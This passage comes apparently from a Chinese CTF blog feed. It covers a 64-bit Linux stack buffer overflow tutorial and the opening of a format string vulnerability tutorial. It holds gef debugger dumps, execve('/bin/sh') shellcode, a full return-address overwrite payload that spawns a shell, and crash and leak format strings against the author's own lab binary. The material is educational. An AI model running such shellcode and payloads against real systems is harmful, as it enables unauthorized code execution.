class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">gef➤  b puts</span><br><span class="line">Breakpoint 1 at 0x1090</span><br><span class="line">gef➤  r $(python -c &#x27;print &quot;A&quot; * 264 + &quot;\x7f\xff\xff\xff\xdd\x40&quot;[::-1]&#x27;) </span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────── registers ────</span><br><span class="line"><span class="meta">$</span><span class="language-bash">rax   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbx   : 0x0000555555555230  →  &lt;__libc_csu_init+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rcx   : 0x00007ffff7ec4077  →  0x5177fffff0003d48 (<span class="string">&quot;H=&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdx   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsp   : 0x00007fffffffde68  →  0x00007fffffffdd40  →  0x0000000000000000</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbp   : 0x4141414141414141 (<span class="string">&quot;AAAAAAAA&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsi   : 0x00005555555592a0  →  <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdi   : 0x00007ffff7fa47e0  →  0x0000000000000000</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rip   : 0x0000555555555228  →  &lt;main+127&gt; ret</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r8    : 0x10f</span>             </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r9    : 0xf</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r10   : 0x0000555555556006  →  0x00443b031b01000a (<span class="string">&quot;\n&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r11   : 0x246</span>             </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r12   : 0x00005555555550c0  →  &lt;_start+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r13   : 0x00007fffffffdf50  →  0x0000000000000002</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r14   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r15   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">eflags: [ZERO carry PARITY adjust sign <span class="built_in">trap</span> INTERRUPT direction overflow resume virtualx86 identification]</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">cs: 0x33 <span class="variable">$ss</span>: 0x2b <span class="variable">$ds</span>: 0x00 <span class="variable">$es</span>: 0x00 <span class="variable">$fs</span>: 0x00 <span class="variable">$gs</span>: 0x00</span> </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x00007fffffffde68│+0x0000: 0x00007fffffffdd40  →  0x0000000000000000 ← $rsp</span><br><span class="line">0x00007fffffffde70│+0x0008: 0x00007ffff7ffc620  →  0x00050a3600000000</span><br><span class="line">0x00007fffffffde78│+0x0010: 0x00007fffffffdf58  →  0x00007fffffffe2a7  →  0x61732f656d6f682f</span><br><span class="line">0x00007fffffffde80│+0x0018: 0x0000000200000000</span><br><span class="line">0x00007fffffffde88│+0x0020: 0x00005555555551a9  →  &lt;main+0&gt; endbr64 </span><br><span class="line">0x00007fffffffde90│+0x0028: 0x0000555555555230  →  &lt;__libc_csu_init+0&gt; endbr64 </span><br><span class="line">0x00007fffffffde98│+0x0030: 0x81a925b6868c83d3</span><br><span class="line">0x00007fffffffdea0│+0x0038: 0x00005555555550c0  →  &lt;_start+0&gt; endbr64 </span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">   0x55555555521d &lt;main+116&gt;       call   0x555555555090 &lt;puts@plt&gt;</span><br><span class="line">   0x555555555222 &lt;main+121&gt;       mov    eax, 0x0</span><br><span class="line">   0x555555555227 &lt;main+126&gt;       leave  </span><br><span class="line"> → 0x555555555228 &lt;main+127&gt;       ret    </span><br><span class="line">   ↳  0x7fffffffdd40                  add    BYTE PTR [rax], al</span><br><span class="line">      0x7fffffffdd42                  add    BYTE PTR [rax], al</span><br><span class="line">      0x7fffffffdd44                  add    BYTE PTR [rax], al</span><br><span class="line">      0x7fffffffdd46                  add    BYTE PTR [rax], al</span><br><span class="line">      0x7fffffffdd48                  and    dl, BYTE PTR [rdx+0x55]</span><br><span class="line">      0x7fffffffdd4b                  push   rbp</span><br><span class="line">─────────────────────────────────────────────────────────── source:bof.c+14 ────</span><br><span class="line">      9       &#125;</span><br><span class="line">     10       printf(&quot;%p\n&quot;, buffer);</span><br><span class="line">     11       strcpy(buffer,  argv[1]);</span><br><span class="line">     12       printf(&quot;%s\n&quot;, buffer);</span><br><span class="line">     13       return 0;</span><br><span class="line"> →   14 &#125;</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] Id 1, Name: <span class="string">&quot;bof&quot;</span>, stopped 0x555555555228 <span class="keyword">in</span> main (), reason: SINGLE STEP</span></span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] 0x555555555228 → main(argc=0x2, argv=0x7fffffffdf58)</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们可以看到，此时的栈顶 (<code>rsp</code>) 为 <code>0x00007fffffffdd40</code>，<code>ret</code> 执行后 <code>rip</code> 就将跳转到 <code>0x00007fffffffdd40</code> 处执行。</p><h2 id="6-执行shellcode"><a class="markdownIt-Anchor" href="#6-执行shellcode"></a> 6. 执行shellcode</h2><p>在这个例子中我准备用个定制的shellcode去打开 shell 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"> </span><br><span class="line">_start:</span><br><span class="line">; execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;], NULL)</span><br><span class="line">; rax = 0x3b, rdx= NULL, rdi = &#x27;//bin/sh&#x27;, rsi = &#x27;//bin/sh&#x27;</span><br><span class="line">xorrdx, rdx</span><br><span class="line">movqword rbx, &#x27;//bin/sh&#x27;; 0x68732f6e69622f2f</span><br><span class="line">shrrbx, 0x8</span><br><span class="line">pushrbx</span><br><span class="line">movrdi, rsp</span><br><span class="line">pushrax</span><br><span class="line">pushrdi</span><br><span class="line">movrsi, rsp</span><br><span class="line">moval, 0x3b</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>接下来汇编这个文件然后提取shellcode。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/overflow$ touch shell.asm</span><br><span class="line">sakura@Kylin:~/文档/overflow$ nasm -f elf64 shell.asm </span><br><span class="line">sakura@Kylin:~/文档/overflow$ ld -m elf_x86_64 shell.o -o shell </span><br><span class="line">sakura@Kylin:~/文档/overflow$ ./shell</span><br><span class="line"><span class="meta">$ </span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line">sakura@Kylin:~/文档/overflow$ for i in $(objdump  -d shell.o | grep &quot;^ &quot; | cut  -f2); do echo  -n  &#x27;\x&#x27;$i; done; echo </span><br><span class="line">\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05</span><br><span class="line">sakura@Kylin:~/文档/overflow$ </span><br></pre></td></tr></table></figure><p>这个 shellcode 长 30 字节，来构造最终的载荷吧。</p><p>原来的载荷</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(python -c <span class="string">&#x27;print &quot;A&quot; * 264 + &quot;\x7f\xff\xff\xff\xdd\x40&quot;[::-1]&#x27;</span>) </span><br></pre></td></tr></table></figure><p>我们要保证一样的大小所以264 - 30 = 234</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(python -c <span class="string">&#x27;print &quot;A&quot; * 234 + &quot;\x7f\xff\xff\xff\xdd\x40&quot;[::-1]&#x27;</span>) </span><br></pre></td></tr></table></figure><p>然后把 shellcode 接在开头：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(python -c <span class="string">&#x27;print  &quot;\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot; + &quot;A&quot; * 234 +  &quot;\x7f\xff\xff\xff\xdd\x40&quot;[::-1]&#x27;</span>) </span><br></pre></td></tr></table></figure><p>来把所有东西一块儿测试：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">gdb-gef bof</span> </span><br><span class="line">gef➤  run $(python -c &#x27;print  &quot;\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot; + &quot;A&quot; * 234 +  &quot;\x7f\xff\xff\xff\xdd\x40&quot;[::-1]&#x27;) </span><br><span class="line">Starting program: /home/sakura/文档/overflow/bof $(python -c &#x27;print  &quot;\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot; + &quot;A&quot; * 234 +  &quot;\x7f\xff\xff\xff\xdd\x40&quot;[::-1]&#x27;)</span><br><span class="line">[*] Failed to find objfile or not a valid file format: [Errno 2] 没有那个文件或目录: &#x27;system-supplied DSO at 0x7ffff7fcd000&#x27;</span><br><span class="line">0x7fffffffdd40</span><br><span class="line">H1�H�//bin/shH�SH��PWH��;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`����</span><br><span class="line">process 4893 is executing new program: /usr/bin/dash</span><br><span class="line"><span class="meta">$ </span></span><br></pre></td></tr></table></figure><p>出现了 $ 就显示我们执行成功了。要注意内存地址是可以变化的这样可能就和我这里的不同了。</p><blockquote><p>参考：</p><p><a href="http://packetstormsecurity.com/files/download/127007/64bit-overflow.pdf">64 Bits Linux Stack Based Buffer Overflow  </a> — 英文原文</p><p><a href="https://juejin.cn/post/6844903571742261262#heading-0">64位Linux下的栈溢出</a> — 中文翻译</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;1-x86和x86_64的区别&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-x86和x86_64的区别&quot;&gt;&lt;/a&gt; 1. x86和x86_64的区别&lt;/h2&gt;
&lt;p&gt;第一个主要区别就是内存地址的大小。这没</summary>
      
    
    
    
    <category term="CTF" scheme="https://www.rgzzplus.com/categories/CTF/"/>
    
    
    <category term="栈溢出" scheme="https://www.rgzzplus.com/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>格式化字符串x86_64</title>
    <link href="https://www.rgzzplus.com/2022/08/27/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2x86-64/"/>
    <id>https://www.rgzzplus.com/2022/08/27/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2x86-64/</id>
    <published>2022-08-27T04:45:33.000Z</published>
    <updated>2022-08-27T04:48:10.688Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="1-格式化输出函数"><a class="markdownIt-Anchor" href="#1-格式化输出函数"></a> 1 格式化输出函数</h2><h3 id="11-变参函数"><a class="markdownIt-Anchor" href="#11-变参函数"></a> 1.1 变参函数</h3><p>C 语言中定义的变参函数，即参数数量可变的函数。它**由一定数量（至少一个）的强制参数和数量可变的可选参数组成，强制参数在前，可选参数在后。**可选参数的类型可以变化，而数量由强制参数的值或者用来定义可选参数列表的特殊值决定。</p><p>printf()就是一个变参函数，它有一个强制参数，即格式化字符串。格式化字符串中的转换指示符决定了可选参数的数量和类型。变参函数要获取可选参数时，必须通过一个类型为 va list 的对象，也称为参数指针，它包含了栈中至少一个参数的位置。使用这个参数指针可以从一个可选参数移动到下一个可选参数，从而获取所有的可选参数。va_list 类型被定义在头文件 stdarg.h 中。</p><h3 id="12-格式转换"><a class="markdownIt-Anchor" href="#12-格式转换"></a> 1.2 格式转换</h3><p>格式字符串是**由普通字符（包括 “%”）和转换规则构成的字符序列。**普通字符被原封不动地复制到输出流中。转换规则根据与实参对应地转换指示符对其进行转换，然后将结果写入输出流中。</p><p>一个转换规则由必选部分和可选部分组成。其中，只有转换指示符（type）是必选部分，用来表示转换类型。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%[parameter][flags][width][.precision][length]type</span><br></pre></td></tr></table></figure><ul><li>parameter，它是一个 POSIX 扩展，不属于 C99，用于指定某个参数，例如<code>%2$d</code>，表示输出后面地第2个参数</li><li>flags，用来调整输出和打印的符号、空白、小数点等。</li><li>width，用来指定输出字符的最小个数。</li><li>精度，用来指示打印符号个数、小数位数或者有效数字个数。</li><li>length，用来指定参数的大小。</li></ul><p>一些常见的转换指示符和长度。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">指示符类型输出</span><br><span class="line">%d  <span class="number">4</span>-byteInteger</span><br><span class="line">%u  <span class="number">4</span>-byteUnsigned Integer</span><br><span class="line">%x  <span class="number">4</span>-byteHex</span><br><span class="line">%s  <span class="number">4</span>-byte ptrString</span><br><span class="line">%c  <span class="number">1</span>-byteCharacter</span><br><span class="line">    </span><br><span class="line">长度 类型 输出</span><br><span class="line">hh  <span class="number">1</span>-byte<span class="type">char</span></span><br><span class="line">h  <span class="number">2</span>-byte<span class="type">short</span> <span class="type">int</span></span><br><span class="line">l  <span class="number">4</span>-byte<span class="type">long</span> <span class="type">int</span></span><br><span class="line">ll  <span class="number">8</span>-byte<span class="type">long</span> <span class="type">long</span> <span class="type">int</span></span><br></pre></td></tr></table></figure><h2 id="2-格式化字符串漏洞"><a class="markdownIt-Anchor" href="#2-格式化字符串漏洞"></a> 2 格式化字符串漏洞</h2><h3 id="21-基本原理"><a class="markdownIt-Anchor" href="#21-基本原理"></a> 2.1 基本原理</h3><p>函数传参存在两种方式，一种是通过栈，一种是通过寄存器。对于x64体系结构，如果函数参数不大于6个时，使用寄存器传参，对于函数参数大于6个的函数，前六个参数使用寄存器传递，后面的使用栈传递。参数传递的规律是固定的，即<strong>前6个参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9</strong>，后面的依次从 “右向左” 放入栈中。</p><blockquote><p>不过有些时候，局部数据必须存入内存</p><p>\1. 寄存器不够放<br>\2. 对一个局部变量使用地址引用符 &amp; ，因为无法对寄存器取地址，因此必须产生一个内存地址，使用到内存<br>\3. 某些局部变量是数组或者结构，必须数组或者结构引用被访问到</p></blockquote><blockquote><p>如想了解更多：<a href="https://bbs.pediy.com/thread-257246.htm">x86_64架构下的函数调用及栈帧原理</a></p></blockquote><p>我们来看一个能产生格式化字符串漏洞的程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s %d %s %p %p %p %p %p %p %p %p %p %p %3$s&quot;</span>, <span class="string">&quot;Hello world!&quot;</span>, <span class="number">233</span>, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">gcc -fno-stack-protector -no-pie fmtdemo.c -o fmtdemo -g</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">./fmtdemo</span></span><br><span class="line">Hello world! 233 </span><br><span class="line"> (nil) 0x7ffff7fe0d60 (nil) 0x7ffff7dda083 0x7ffff7ffc620 0x7fffffffe0d8 0x100000000 0x401136 0x401170 0x3543f5d3292dd502 </span><br></pre></td></tr></table></figure><p>先编译运行一下，我们发现程序输出了 3个异样的数字，接下来我们调试一下程序。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">$ gdb-gef fmtdemo</span><br><span class="line">gef➤  b printf</span><br><span class="line">Breakpoint 1 at 0x401040</span><br><span class="line">gef➤  r</span><br><span class="line">Starting program: /home/sakura/文档/print/fmtdemo </span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x00007ffff7e17c90 in printf () from /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line"></span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────── registers ────</span><br><span class="line">$rax   : 0x0               </span><br><span class="line">$rbx   : 0x0000000000401170  →  &lt;__libc_csu_init+0&gt; endbr64 </span><br><span class="line">$rcx   : 0x0000000000402008  →  0x206f6c6c6548000a (&quot;\n&quot;?)</span><br><span class="line">$rdx   : 0xe9              </span><br><span class="line">$rsp   : 0x00007fffffffdf78  →  0x0000000000401162  →  &lt;main+44&gt; nop </span><br><span class="line">$rbp   : 0x00007fffffffdf80  →  0x0000000000000000</span><br><span class="line">$rsi   : 0x000000000040200a  →  &quot;Hello world!&quot;</span><br><span class="line">$rdi   : 0x0000000000402018  →  &quot;%s %d %s %p %p %p %p %p %p %p %p %p %p %3$s&quot;</span><br><span class="line">$rip   : 0x00007ffff7e17c90  →  &lt;printf+0&gt; endbr64 </span><br><span class="line">$r8    : 0x0               </span><br><span class="line">$r9    : 0x00007ffff7fe0d60  →   endbr64 </span><br><span class="line">$r10   : 0x000000000040042b  →  0x5f0066746e697270 (&quot;printf&quot;?)</span><br><span class="line">$r11   : 0x00007ffff7e17c90  →  &lt;printf+0&gt; endbr64 </span><br><span class="line">$r12   : 0x0000000000401050  →  &lt;_start+0&gt; endbr64 </span><br><span class="line">$r13   : 0x00007fffffffe070  →  0x0000000000000001</span><br><span class="line">$r14   : 0x0               </span><br><span class="line">$r15   : 0x0               </span><br><span class="line">$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x00007fffffffdf78│+0x0000: 0x0000000000401162  →  &lt;main+44&gt; nop  ← $rsp</span><br><span class="line">0x00007fffffffdf80│+0x0008: 0x0000000000000000 ← $rbp</span><br><span class="line">0x00007fffffffdf88│+0x0010: 0x00007ffff7dda083  →  &lt;__libc_start_main+243&gt; mov edi, eax</span><br><span class="line">0x00007fffffffdf90│+0x0018: 0x00007ffff7ffc620  →  0x00050a3600000000</span><br><span class="line">0x00007fffffffdf98│+0x0020: 0x00007fffffffe078  →  0x00007fffffffe3b4  →  0x61732f656d6f682f</span><br><span class="line">0x00007fffffffdfa0│+0x0028: 0x0000000100000000</span><br><span class="line">0x00007fffffffdfa8│+0x0030: 0x0000000000401136  →  &lt;main+0&gt; endbr64 </span><br><span class="line">0x00007fffffffdfb0│+0x0038: 0x0000000000401170  →  &lt;__libc_csu_init+0&gt; endbr64 </span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">   0x7ffff7e17c81 &lt;fprintf+177&gt;    ret    </span><br><span class="line">   0x7ffff7e17c82 &lt;fprintf+178&gt;    call   0x7ffff7ee5a70 &lt;__stack_chk_fail&gt;</span><br><span class="line">   0x7ffff7e17c87                  nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line"> → 0x7ffff7e17c90 &lt;printf+0&gt;       endbr64 </span><br><span class="line">   0x7ffff7e17c94 &lt;printf+4&gt;       sub    rsp, 0xd8</span><br><span class="line">   0x7ffff7e17c9b &lt;printf+11&gt;      mov    r10, rdi</span><br><span class="line">   0x7ffff7e17c9e &lt;printf+14&gt;      mov    QWORD PTR [rsp+0x28], rsi</span><br><span class="line">   0x7ffff7e17ca3 &lt;printf+19&gt;      mov    QWORD PTR [rsp+0x30], rdx</span><br><span class="line">   0x7ffff7e17ca8 &lt;printf+24&gt;      mov    QWORD PTR [rsp+0x38], rcx</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[#0] Id 1, Name: &quot;fmtdemo&quot;, stopped 0x7ffff7e17c90 in printf (), reason: BREAKPOINT</span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#0] 0x7ffff7e17c90 → printf()</span><br><span class="line">[#1] 0x401162 → main()</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  </span><br></pre></td></tr></table></figure><p>可以看到，r9=0x00007ffff7fe0d60，(nil) 0x7ffff7ffc620 0x7fffffffe0d8 0x100000000 0x401136 0x401170都是栈中 0x00007fffffffdf80~0x00007fffffffdfb0 的数据。其中 rbp =（nil），如果我们能通过某种方法找到 rbp 的位置并将 shellcode 的入口地址覆盖到这个位置，那么当函数返回时，就会跳转到去运行我们的shellcode了。</p><p>我们可以总结出，其实**格式字符串漏洞发生的条件就是格式字符串要求的参数和实际提供的参数不匹配。**下面我们讨论两个问题：</p><ul><li><p>为什么可以通过编译？</p><ul><li>因为 <code>printf()</code> 函数的参数被定义为可变的。</li><li>为了发现不匹配的情况，编译器需要理解 <code>printf()</code> 是怎么工作的和格式字符串是什么。然而，编译器并不知道这些。</li><li>有时格式字符串并不是固定的，它可能在程序执行中动态生成。</li></ul></li><li><pre class="highlight"><code class>printf()<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    函数自己可以发现不匹配吗？</span><br><span class="line"></span><br><span class="line">    -   `printf()` 函数从栈中取出参数，如果它需要 3 个，那它就取出 3 个。除非栈的边界被标记了，否则 `printf()` 是不会知道它取出的参数比提供给它的参数多了。然而并没有这样的标记。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 2.2 漏洞利用</span><br><span class="line"></span><br><span class="line">通过提供格式字符串，我们就能够控制格式化函数的行为。漏洞的利用主要有下面几种。</span><br><span class="line"></span><br><span class="line">#### 2.2.1 使程序崩溃</span><br><span class="line"></span><br><span class="line">格式化字符串漏洞通常要在程序崩溃时才会被发现， 这也是最简单的利用方式。 在 Linux 中，存取无效的指针会使进程收到 `SIGSEGV` 信号， 从而**使程序非正常终止并产生核心转储**， 其中存储了程序崩溃时的许多重要信息， 而这些信息正是攻击者所需要的。</span><br><span class="line"></span><br><span class="line">通常， 使用类似下面的格式字符串即可触发崩溃。</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line">printf(&quot;%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s&quot;) </span><br></pre></td></tr></table></figure></code></pre></li></ul><p>原因有 3 点：<br>(1) 对于每一个“％s”，printf() 都要从栈中获取一个数字， 将其视为一个地址， 然后打印出地址指向的内存， 直到出现一个 NULL 字符;<br>(2) 不可能获取的每一个数字都是地址，数字所对应的内存可能并不存在<br>(3) 还有可能获得的数字确实是一个地址，但是该地址是被保护的。</p><h4 id="222-栈数据泄露"><a class="markdownIt-Anchor" href="#222-栈数据泄露"></a> 2.2.2 栈数据泄露</h4><p>虽然在 x86_64 位操作系统下，函数通过寄存器传参，很难得到有效栈信息。不过，如果有办法，找到超过六个参数以上的函数，超出的部分参数就会逆序压入栈中，还有有机会获得栈内存数据的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//fmtdemo.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> format[<span class="number">128</span>];</span><br><span class="line">    <span class="type">int</span> arg1 = <span class="number">1</span>, arg2 = <span class="number">0x88888888</span>, arg3 = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">char</span> arg4[<span class="number">10</span>] = <span class="string">&quot;ABCDEFGH&quot;</span>;</span><br><span class="line">    